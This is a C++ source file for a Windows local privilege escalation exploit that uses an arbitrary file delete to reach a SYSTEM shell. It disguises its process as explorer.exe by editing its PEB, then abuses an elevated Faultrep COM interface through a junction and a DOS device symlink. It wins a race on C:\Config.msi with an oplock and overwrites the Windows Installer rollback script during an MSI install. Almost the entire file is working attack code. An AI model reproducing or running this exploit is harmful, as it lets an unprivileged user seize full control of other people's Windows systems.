//Credits: @FuzzySec / @Cneelis (MasqueradePEB), @tiraniddo (FileOpLock), @klinix5 (research on arbitrary file delete to system shell) 

#include "def.h"


int wmain(int argc, wchar_t** argv) {
	
	load();
	HANDLE hDir = myCreateDirectory(BuildPath(uac), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create %ls\n directory", uac);
		return 1;
	}
	if (!CreateJunction(uac, L"\\RPC Control")) {
		printf("[!] Exiting!\n");
		return 1;
	}
	if (!DosDeviceSymLink(object, BuildPath(target))) {
		printf("[!] Exiting!\n");
		return 1;
	}
    hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to create C:\\Config.msi directory. Trying to delete it.\n");
        install(NULL);
        hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            printf("[+] Successfully removed and recreated C:\\Config.Msi.\n");
        }
        else
        {
            printf("[!] Failed. Cannot remove c:\\Config.msi");
            return 1;
        }
    }
    if (!PathIsDirectoryEmpty(L"C:\\Config.Msi"))
    {
        printf("[!] Failed.  C:\\Config.Msi already exists and is not empty.\n");
        return 1;
    }

    printf("[+] Config.msi directory created!\n");
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Fail, NULL, 0, NULL);
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
	SetThreadPriorityBoost(GetCurrentThread(), TRUE);      
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	FileOpLock* oplock;
	oplock = FileOpLock::CreateLock(hFile, cb2);
	if (oplock != nullptr) {
		Trigger(uac);
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	do {
		hFile = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF);
	} while (!hFile);
	char buff[4096];
	DWORD retbt = 0;
	FILE_NOTIFY_INFORMATION* fn;
	WCHAR* extension;
	WCHAR* extension2;
	do {
		ReadDirectoryChangesW(hFile, buff, sizeof(buff) - sizeof(WCHAR), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME,
			&retbt, NULL, NULL);
		fn = (FILE_NOTIFY_INFORMATION*)buff;
		size_t sz = fn->FileNameLength / sizeof(WCHAR);
		fn->FileName[sz] = '\0';
		extension = fn->FileName;
		PathCchFindExtension(extension, MAX_PATH, &extension2);
	} while (wcscmp(extension2, L".rbs") != 0);

	SetSecurityInfo(hFile, SE_FILE_OBJECT, UNPROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	while (!Move(hFile)) {

	}
	HANDLE cfg_h = myCreateDirectory(BuildPath(L"C:\\Config.msi"), FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE);
	WCHAR rbsfile[MAX_PATH];
	_swprintf(rbsfile, L"C:\\Config.msi\\%s", fn->FileName);
	HANDLE rbs = CreateFile(rbsfile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (WriteFile(rbs, RbsBuff, RbsSize, NULL, NULL)) {
		printf("[+] RBS file overwritten!\n");

	}
	else
	{
		printf("[!] Failed to overwrite rbs file!\n");
	}
	CloseHandle(rbs);
	CloseHandle(cfg_h);
	DeleteJunction(BuildPath(uac));
	DelDosDeviceSymLink(object, BuildPath(target));
	RemoveDirectory(uac);
	return 0;
	

}

VOID Trigger(WCHAR* dir) {
	MasqueradePEB();
	HRESULT init = CoInitialize(NULL);
	IFaultrepElevatedDataCollection* collection;
	BIND_OPTS3 bop;
	RtlSecureZeroMemory(&bop, sizeof(bop));
	bop.cbStruct = sizeof(bop);
	bop.dwClassContext = 4;
	BSTR test = SysAllocString(dir);
	BSTR test2 = SysAllocString(L"Process=1337");
	HRESULT hr = CoGetObject(CLSID_Faultrep_Elevation, &bop, __uuidof(collection), (PVOID*)&collection);
	if (SUCCEEDED(hr)) {
		hr = collection->Proc6(test2, test);
	}

}

void load() {
	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (ntdll != NULL) {
		pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
		pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
		pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
		pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
		pRtlEnterCriticalSection = (_RtlEnterCriticalSection)GetProcAddress(ntdll, "RtlEnterCriticalSection");
		pRtlLeaveCriticalSection = (_RtlLeaveCriticalSection)GetProcAddress(ntdll, "RtlLeaveCriticalSection");
	}
	if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtQueryInformationProcess == NULL || pRtlLeaveCriticalSection == NULL || pRtlEnterCriticalSection == NULL || pNtSetInformationFile == NULL) {
		printf("Cannot load api's %d\n", GetLastError());
		exit(0);
	}

}
BOOL MasqueradePEB() {
	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;
	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	pNtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	pRtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	pRtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	pRtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			pRtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			pRtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	pRtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
	HANDLE hJunction;
	DWORD cb;
	wchar_t printname[] = L"";
	HANDLE hDir;
	hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", dir);
		return FALSE;
	}

	SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
	SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
	SIZE_T PathLen = TargetLen + PrintnameLen + 12;
	SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
	PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
	Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	Data->ReparseDataLength = PathLen;
	Data->Reserved = 0;
	Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
	Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
	Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
	memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

	if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
	{
		printf("[+] Junction %ls -> %ls created!\n", dir, target);
		free(Data);
		return TRUE;

	}
	else
	{
		printf("[!] Error: %d. Exiting\n", GetLastError());
		free(Data);
		return FALSE;
	}
}
BOOL DeleteJunction(LPCWSTR path) {
	REPARSE_GUID_DATA_BUFFER buffer = { 0 };
	BOOL ret;
	buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
	DWORD cb = 0;
	IO_STATUS_BLOCK io;


	HANDLE hDir;
	hDir = CreateFile(path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

	if (hDir == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to obtain handle on directory %ls.\n", path);
		printf("%d\n", GetLastError());
		return FALSE;
	}
	ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
	if (ret == 0) {
		printf("Error: %d\n", GetLastError());
		return FALSE;
	}
	else
	{
		printf("[+] Junction %ls deleted!\n", path);
		return TRUE;
	}
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
		printf("[+] Symlink %ls -> %ls created!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;

	}
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
	if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
		printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
		return TRUE;

	}
	else
	{
		printf("error :%d\n", GetLastError());
		return FALSE;


	}
}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
	UNICODE_STRING ufile;
	HANDLE hDir;
	pRtlInitUnicodeString(&ufile, file);
	OBJECT_ATTRIBUTES oa = { 0 };
	IO_STATUS_BLOCK io = { 0 };
	InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

	retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

	if (!NT_SUCCESS(retcode)) {
		return NULL;
	}
	return hDir;
}
DWORD WINAPI install(void*) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_MSI1), L"msi");
	wchar_t msipackage[MAX_PATH] = { 0x0 };
	GetTempFileName(L"C:\\windows\\temp\\", L"MSI", 0, msipackage);
	printf("[*] MSI file: %ls\n", msipackage);
	DWORD MsiSize = SizeofResource(hm, res);
	void* MsiBuff = LoadResource(hm, res);
	HANDLE pkg = CreateFile(msipackage, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(pkg, MsiBuff, MsiSize, NULL, NULL);
	CloseHandle(pkg);
	MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
	UINT a = MsiInstallProduct(msipackage, L"ACTION=INSTALL");
	MsiInstallProduct(msipackage, L"REMOVE=ALL");
	DeleteFile(msipackage);
	return 0;
}
BOOL Move(HANDLE hFile) {
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Invalid handle!\n");
		return FALSE;
	}
	wchar_t tmpfile[MAX_PATH] = { 0x0 };
	RPC_WSTR str_uuid;
	UUID uuid = { 0 };
	UuidCreate(&uuid);
	UuidToString(&uuid, &str_uuid);
	_swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
	size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
	FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
	IO_STATUS_BLOCK io = { 0 };
	rename_info->ReplaceIfExists = TRUE;
	rename_info->RootDirectory = NULL;
	rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
	rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
	memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
	NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
	if (status != 0) {
		return FALSE;
	}
	return TRUE;
}


void cb2() {

	SetThreadPriority(GetCurrentThread(), REALTIME_PRIORITY_CLASS);
	Move(hFile);

	//loop until the directory found
	hthread = CreateThread(NULL, NULL, install, NULL, NULL, NULL);
	HANDLE hd;
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (!hd);
	do {
		CloseHandle(hd);
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);
	} while (hd);
	CloseHandle(hd);
	do {
		hd = myCreateDirectory(BuildPath(L"C:\\Config.msi"), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN);

		CloseHandle(hd);
	} while (retcode != 0xC0000022);
}
LPWSTR  BuildPath(LPCWSTR path) {
	wchar_t ntpath[MAX_PATH];
	swprintf(ntpath, L"\\??\\%s", path);
	return ntpath;
}
VOID Fail() {
	Sleep(3000);
	printf("[!] Race condtion failed!\n");
	DeleteJunction(L"\\??\\C:\\windows\\temp\\uac");
	DelDosDeviceSymLink(object, BuildPath(target));
	exit(1);
}